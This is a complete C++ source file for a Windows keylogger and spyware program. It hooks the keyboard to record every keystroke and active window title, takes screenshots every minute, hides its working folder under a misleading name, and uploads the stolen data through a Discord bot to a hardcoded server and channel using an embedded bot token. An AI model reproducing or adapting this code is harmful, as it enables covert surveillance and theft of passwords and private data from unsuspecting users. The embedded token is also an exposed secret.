#define _CRT_SECURE_NO_WARNINGS     //fuck msvc
#define UNICODE

#pragma once
//Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
//external headers warning (there are ways too much warnings there). This is workaround
#pragma warning (push, 0)
#include <dpp/cluster.h>
#include <dpp/once.h>

#include <cstdio>
#include <ctime>
#include <cassert>
#include <fstream>
#include <iostream>
#include <map>
#include <vector>
#include <functional>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <algorithm>
#include <list>
#include <filesystem>

#include <windows.h>
#include <ShlObj.h>
#include <Gdiplus.h>

#define NOMINMAX //get rid of windef.h bad max/min impl, place here so that it won't brok gdiplus

#pragma warning (pop)

// #define sh_winapi_success(x) assert(x == S_OK)
// #define winapi_success(x) assert(x != 0)


HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

std::map<std::string, unsigned int> mapper;
unsigned int process_counter = 0;

unsigned long long key_fileindex = 0, image_fileindex = 0;

const WCHAR *LOGGER_FILENAME = L"thislog.txt";
WCHAR local_appdata_path[MAX_PATH+5];
WCHAR bitmap_path[MAX_PATH+5];

std::ofstream logger_file;

std::condition_variable condvar;

ULONG_PTR GDIPLUS_TOKEN;

struct COMMAND_LINE_OPTION {
	static inline std::string BOT_TOKEN = "Nzk1MjgzNjM2MDg1MzI1ODI1.Gi9kUj.ZBA78aLZeE_ZNnQuQM3LYIXTIfq11eYNMcUKbk";
	static inline unsigned long long BOT_GUILD_ID = 664744934003310592;
	static inline unsigned long long BOT_CHANNEL_ID = 1056052934921699388;
	static inline bool COMPRESSED_MODE = false;

	COMMAND_LINE_OPTION() = delete;
	COMMAND_LINE_OPTION(COMMAND_LINE_OPTION&& op) = delete;
};

//won't create any local files except the running log. Use list for better
//optimization in concurrent element accessing and removing elements.
std::list<std::string> file_list;

const std::map<const dpp::loglevel, const std::string> DPP_LOGLEVEL_MAP {
	{dpp::loglevel::ll_trace, "[TRACE] "},
	{dpp::loglevel::ll_debug, "[DEBUG] "},
	{dpp::loglevel::ll_info, "[INFO] "},
	{dpp::loglevel::ll_warning, "[WARN] "},
	{dpp::loglevel::ll_error, "[ERORR] "},
	{dpp::loglevel::ll_critical, "[CRITICAL!] "},
};

const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BKSPACE]" },
	{VK_RETURN,	"[ENTER]" },
	{VK_SPACE,	"[SPACE]" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CTRL]" },
	{VK_LCONTROL,	"[LCTRL]" },
	{VK_RCONTROL,	"[LCTRL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PGUP]" },
	{VK_NEXT,	"[PGDOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
    {VK_NUMLOCK, "[NUMLK]"},
	{VK_CAPITAL,	"[CAPSLK]" },
	{VK_DELETE, "[DELETE]"},
    {VK_F1, "[F1]"}, 
    {VK_F2, "[F2]"}, 
    {VK_F3, "[F3]"}, 
    {VK_F4, "[F4]"}, 
    {VK_F5, "[F5]"}, 
    {VK_F6, "[F6]"}, 
    {VK_F7, "[F7]"}, 
    {VK_F8, "[F8]"}, 
    {VK_F9, "[F9]"}, 
    {VK_F10, "[F10]"}, 
    {VK_F11, "[F11]"}, 
    {VK_F12, "[F12]"}, 
    {VK_VOLUME_MUTE, "[VOLUME_MUTE]"},
    {VK_VOLUME_DOWN, "[VOLUME_DOWN]"},
    {VK_VOLUME_UP, "[VOLUME_UP]"},
    {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT]"},
    {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV]"},
    {VK_MEDIA_STOP, "[MEDIA_STOP]"},
    {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"}
};

std::unique_ptr<dpp::cluster> bot;
dpp::message keymsg, imagemsg;

inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
}

inline void mb_to_wide_char(char* input, WCHAR* output, int outputbuf) {
	MultiByteToWideChar(CP_UTF8, 0, input, -1, output, outputbuf);
}

/// @brief Log to file.  Maximum 1000 characters
/// @param format formatted string, just like printf
/// @param
inline void logger(const char* format, ...) {
	char __buf[1001];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	va_end(arg);

	logger_file.write(__buf, strlen(__buf));
	logger_file.flush();
}

/// @brief Print to container.
/// @param format formatted string, just like printf
/// @param
inline void print_to(const char* format, ...) {
    char __buf[1001];
	va_list arg;
	va_start(arg, format);
	vsnprintf(__buf, 1000, format, arg);
	va_end(arg);

	if(file_list.back().size() >= 7000000) [[unlikely]] {
		file_list.push_back(std::string());
	}
	file_list.back().append(__buf);
}

/*Return -1 if fail, non-negative if success*/
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if(size == 0) return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if(pImageCodecInfo == NULL) return -1;  // Failure

    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    for(UINT j = 0; j < num; ++j) {
        if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 ) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }    
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

/// @brief Capture screenshot
/// @param allocatedJPG [out] Pointer to the pointer contain allocated memory. Caller clean-up
/// @param allocatedsize [out] size of the allocated memory
/// @return 0 is success, otherwise fail; Buffer must be cleaned up using C function free()
int WINAPI MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize) {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE *bBits = NULL;
    DWORD cbBits, dwWritten = 0;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int returncode = 0;

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    //compress

    CLSID pngClsid;

    LARGE_INTEGER __TEMP_SEEK_OFFSET;
    __TEMP_SEEK_OFFSET.QuadPart = 0;

    IStream *rawbitmap_stream, *jpg_stream = NULL;
    STATSTG *jpg_stat = (STATSTG*) malloc(sizeof(STATSTG));

    unsigned int memblocksize = (unsigned int) sizeof(BITMAPFILEHEADER) + (unsigned int) sizeof(BITMAPINFOHEADER) + cbBits;
    char *memblock = (char*) malloc(memblocksize);
    memcpy(memblock, &bfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(memblock + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));
    memcpy(memblock + (sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)), bBits, cbBits);

    CreateStreamOnHGlobal(NULL, TRUE, &rawbitmap_stream);
    CreateStreamOnHGlobal(NULL, TRUE, &jpg_stream);
    rawbitmap_stream->Write(memblock, memblocksize, &dwWritten);    

    Gdiplus::Image image(rawbitmap_stream);

    if(GetEncoderClsid(L"image/jpeg", &pngClsid) == -1) {
        returncode = -2;
        goto __retlabel;
    }

    if(image.Save(jpg_stream, &pngClsid, NULL) != Gdiplus::Ok) {
        returncode = -1;
        goto __retlabel;
    }

    jpg_stream->Stat(jpg_stat, 1); //specified no name
    *allocatedsize = (unsigned int) jpg_stat->cbSize.QuadPart;
    *allocatedJPG = (char*) malloc(*allocatedsize);

    //seek back to beginning to read
    if(jpg_stream->Seek(__TEMP_SEEK_OFFSET, STREAM_SEEK_SET, NULL) != S_OK) {
        returncode = -2;
        goto __retlabel;
    }
    if(jpg_stream->Read(*allocatedJPG, *allocatedsize, &dwWritten) != S_OK) {
        returncode = -2;
        goto __retlabel;
    }

    __retlabel:
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

	jpg_stream->Release();
    rawbitmap_stream->Release();
    free(jpg_stat);
    free(memblock);
	return returncode;
}

// void send_data(std::string& err) {
void send_data() {
	while(true) {
		std::this_thread::sleep_for(std::chrono::minutes(1));	//test

		std::string err = "ok!";	//temp
		bool __is_failed = false;

		//new write location!
		file_list.push_back(std::string());
		while(file_list.size() > 1) {
			
			if(file_list.begin()->size() > 0) {
				//for "safety issue" and since file are 7 mb each so we would send everyfile one by one
				//filename when upload to discord is unnecessary, so let it in order
				keymsg.add_file(std::to_string(key_fileindex).append(".txt"), file_list.front());
			} else {
				keymsg.set_content("No key data recorded yet!");
			}
			
			bot->message_create(keymsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
				if (eventret.is_error()) {
					err = eventret.get_error().message;
					__is_failed = true;
					return dpp::utility::log_error()(eventret);
				}
			});
			key_fileindex++;
			keymsg.filename.clear();
			keymsg.filecontent.clear();
			keymsg.set_content("Data sent!");
			if(__is_failed) return;
			
			file_list.erase(file_list.begin());
		}

		// //image data!
		// WCHAR jpg_path[MAX_PATH+5];
		// CHAR mbjpg_path[MAX_PATH+75];
		// WCHAR __jpg_path_numtostring[31];
		// char *jpg_buffer;
		// size_t jpg_size = 0;
		// wcscpy(bitmap_path, local_appdata_path);
		// wcscat(bitmap_path, L"\\bitmap.bmp");

		// swprintf(__jpg_path_numtostring, L"\\%llu.jpg", image_fileindex);
		// wcscpy(jpg_path, local_appdata_path);
		// wcscat(jpg_path, __jpg_path_numtostring);

		// SaveBitmap(bitmap_path);
		// CompressBitmap(bitmap_path, jpg_path);

		char *jpg_buffer;
		unsigned int jpg_size;
		MakeBitmap(&jpg_buffer, &jpg_size);

		// ifstream jpg_infile(std::filesystem::path(jpg_path), std::ios::in);
		// jpg_infile.seekg(0, jpg_infile.end);
		// jpg_size = jpg_infile.tellg();
		// jpg_infile.seekg(0, jpg_infile.beg);
		// jpg_buffer = new char[jpg_size];
		// jpg_infile.read(jpg_buffer, jpg_size);
		// if(!jpg_infile) {
		// 	//Fail
		// }
		
		// wide_char_to_mb(jpg_path, mbjpg_path, wcslen(jpg_path));
		// imagemsg.add_file(std::string(mbjpg_path), std::string(jpg_buffer));
		imagemsg.add_file(std::to_string(image_fileindex).append(".jpg"), std::string(jpg_buffer, jpg_size));
		
		//cleanup first
		// delete[] jpg_buffer;
		// jpg_infile.close();
		// DeleteFile(jpg_path);
		// DeleteFile(bitmap_path);
		free(jpg_buffer);

		//fix fix this
		bot->message_create(imagemsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
			if (eventret.is_error()) {
				err = eventret.get_error().message;
				__is_failed = true;
				return dpp::utility::log_error()(eventret);
			}
		});
		image_fileindex++;
		imagemsg.filename.clear();
		imagemsg.filecontent.clear();
		if(__is_failed) return;

	}
}

int Save_compressed(int key_stroke) {
	static WCHAR lastwindow[260] = L"";	//must be static or thing will break!
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground) {
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground) {
		WCHAR window_title[260];
		char mbwindow_title[260];

		GetWindowTextW(foreground, window_title, 256);
		if (wcscmp(window_title, lastwindow) != 0)
		{
			wcscpy(lastwindow, window_title);
			wide_char_to_mb(window_title, mbwindow_title, 260);
			std::string strwindow_title(mbwindow_title);
			time_t timestamp = time(NULL);

			if (mapper[strwindow_title] == 0) {
				if (process_counter >= ~(0U)) {
					assert(false && "Internal error! Map overflowed");
				}
				mapper[strwindow_title] = ++process_counter;
				// logger("\nNew map: %d %s\n", process_counter, mbwindow_title);
				print_to("\n>%u %s\n", process_counter, strwindow_title.c_str());
			}

			unsigned int mapper_id = mapper[strwindow_title];
			// logger("\nMap: Stamp: %u %llu\n", mapper_id, timestamp);
			print_to("\n[%u %lld\n", mapper_id, timestamp);
		}
	}

	print_to("%.2x", key_stroke);

	return 0;
}

int Save(int key_stroke) {
	static WCHAR lastwindow[260] = L"";
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		WCHAR window_title[260];
		char mbwindow_title[260], s[64];
		
		GetWindowTextW(foreground, window_title, 256);
		if (wcscmp(window_title, lastwindow) != 0)
		{
			wcscpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			strftime(s, sizeof(s), "%c", &tm);

			wide_char_to_mb(window_title, mbwindow_title, 260);
			print_to("\n\n[Window: %s - at %s] ", mbwindow_title, s);
		}
	}
	
	if (keyname.find(key_stroke) != keyname.end()) {
		print_to("%s", keyname.at(key_stroke).c_str());
	} else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		print_to("%c", key);
	}
	
	return 0;
}


LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN) {
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		Save(kbdStruct.vkCode);
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

short is_bot_connected = 0;
std::mutex bot_connected_lock;
std::condition_variable bot_connected_condvar;

//Search for local appdata, make log file, say hello world before everything start
inline void preinit() {
	// Initialize gdi+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	Gdiplus::GdiplusStartup(&GDIPLUS_TOKEN, &gdiplusStartupInput, NULL);

	// Check and create local directory. Usually the loader would already created this before 
	SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata_path);
	wcscat(local_appdata_path, L"\\i_shell_link_shortcut_backup\\");
    if(!CreateDirectoryW(local_appdata_path, NULL)) {
        if(GetLastError() != ERROR_ALREADY_EXISTS) {
            exit(EXIT_FAILURE);
        }
    }
	SetFileAttributesW(local_appdata_path, FILE_ATTRIBUTE_HIDDEN);

	WCHAR __logfilepath[501];
	wcscpy(__logfilepath, local_appdata_path);
	wcscat(__logfilepath, LOGGER_FILENAME);

	// //Pre-create the file and make it hidden; next time open and write to it
	// HANDLE __ico_file_handle = CreateFileW(file_path,
    //                                     GENERIC_READ | GENERIC_WRITE, 
    //                                     0, 
    //                                     NULL, 
    //                                     CREATE_ALWAYS, 
    //                                     FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL,
    //                                     NULL);
	// CloseHandle(__ico_file_handle);
	logger_file.open(std::filesystem::path(__logfilepath), std::ios::app);

	if(!logger_file) {
		exit(EXIT_FAILURE);
	}

	//Time for logging
	time_t __t = time(NULL);
	struct tm *__timestruct;
	__timestruct = std::localtime(&__t);
	char __timestr[65];
	__timestr[0] = '\0';
	if(__timestruct != nullptr) [[likely]] {
		strftime(__timestr, sizeof(__timestr), "%c", __timestruct);
	}

	// logging
	logger("\nHello world! Current time is %s\n", __timestr);
	#if defined(__GNUC__)
        logger("Built with GCC %d.%d.%d ", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
        #if defined(__MINGW64__)
            logger("(MinGW-w64 %d.%d) ", __MINGW64_VERSION_MAJOR, __MINGW64_VERSION_MINOR);
        #elif defined(__MINGW32__)
            logger("(MinGW %d.%d) ", __MINGW32_MAJOR_VERSION, __MINGW32_MINOR_VERSION);
        #endif
    #elif defined(_MSC_VER)
        logger("Built with MSVC %d ", _MSC_VER);
    #else
        logger("Built with unknown compiler ");
    #endif
        logger("on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, sizeof(void*) << 3, dpp::utility::version().c_str());
}

void logrun()
{
	std::unique_lock<std::mutex> locker(bot_connected_lock);
	while (is_bot_connected == 0) bot_connected_condvar.wait(locker);
	if (is_bot_connected != -1) {
		logger("[INFO] Bot successfully initialized. Logging...\n");
	} else {
		logger("[CRITICAL!] Bot failed to initialized. Terminating...\n");
		exit(EXIT_FAILURE);
	}

	if (!(_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		logger("[CRITICAL!] Failed to install hook. Terminating...\n");
		exit(EXIT_FAILURE);
	}
	MSG msg;
	while (true) {
		GetMessageW(&msg, NULL, 0, 0);
	}
}

void botrun()
{
	is_bot_connected = 0;
    try {
        /* Create bot cluster */
        bot = std::unique_ptr<dpp::cluster>(new dpp::cluster(COMMAND_LINE_OPTION::BOT_TOKEN,
            dpp::i_default_intents,
            0, 0, 2, true,
            { dpp::cp_aggressive, dpp::cp_aggressive, dpp::cp_aggressive },
            10, 0));

		/* Configure/redirect log messages to logger file */
		bot->on_log([](const dpp::log_t& loghandle) {
			logger("%s%s\n", DPP_LOGLEVEL_MAP.at(loghandle.severity).c_str(), loghandle.message.c_str());
		});

        /* Handle slash command */
		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
			size_t issuing_user = event.command.get_issuing_user().id;
			std::string issuing_command = event.command.get_command_name();
			if (issuing_command == "ping") {
				char buffer[1001];
				snprintf(buffer, 1000, "Pong! %f ms", bot->rest_ping);
				event.reply(buffer);
			}
			if (issuing_command == "version") {
				char buffer[1001];
				snprintf(buffer, 1000, "Hello world! Running on %s. Current time is %s",
					dpp::utility::version().c_str(),
					dpp::utility::current_date_time().c_str());
				event.reply(buffer);
			}
			logger("[INFO] User %llu executed %s\n", issuing_user, issuing_command.c_str());
        });

		keymsg = dpp::message(bot.get());
		keymsg.set_guild_id(COMMAND_LINE_OPTION::BOT_GUILD_ID);
		keymsg.set_channel_id(COMMAND_LINE_OPTION::BOT_CHANNEL_ID);

		imagemsg = dpp::message(bot.get());
		imagemsg.set_guild_id(COMMAND_LINE_OPTION::BOT_GUILD_ID);
		imagemsg.set_channel_id(COMMAND_LINE_OPTION::BOT_CHANNEL_ID);
		imagemsg.set_content("Image sent!");

        /* Register slash command here in on_ready */
        bot->on_ready([](const dpp::ready_t& event) {
            /* Wrap command registration in run_once to make sure it doesnt run on every full reconnection */
            if (dpp::run_once<struct register_bot_commands>()) {
                bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
				bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
            }

			keymsg.set_content("Session initialized!");
			bot->message_create(keymsg);
			keymsg.set_content("Data sent!");
        });
    
        /* Start the bot */
        bot->start(true);
		is_bot_connected = 1;
		bot_connected_condvar.notify_all();
    }
    catch (dpp::exception& e) {
        logger("\n[ERROR] %s\n", e.what());
		is_bot_connected = -1;
		bot_connected_condvar.notify_all();
    }

	std::thread t3(send_data);
	t3.join();
}

bool cmdline_parse(int argc, WCHAR** argv) {
	for(int i=1; i <= argc; i++) {

	}
	return true;
}

//now switch to windows subsystem, no longer console
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	int argc;
	WCHAR** argv = CommandLineToArgvW(pCmdLine, &argc);
	cmdline_parse(argc, argv);

	preinit();

	//initial
	file_list.push_back(std::string());

	//currently program only run we successfully connect to discord... will make delayed connection soon
	std::thread t1(botrun);
	std::thread t2(logrun);

	t1.join();
	t2.join();

	bot->shutdown();
	logger_file.close();
	Gdiplus::GdiplusShutdown(GDIPLUS_TOKEN);
	return 0;
}
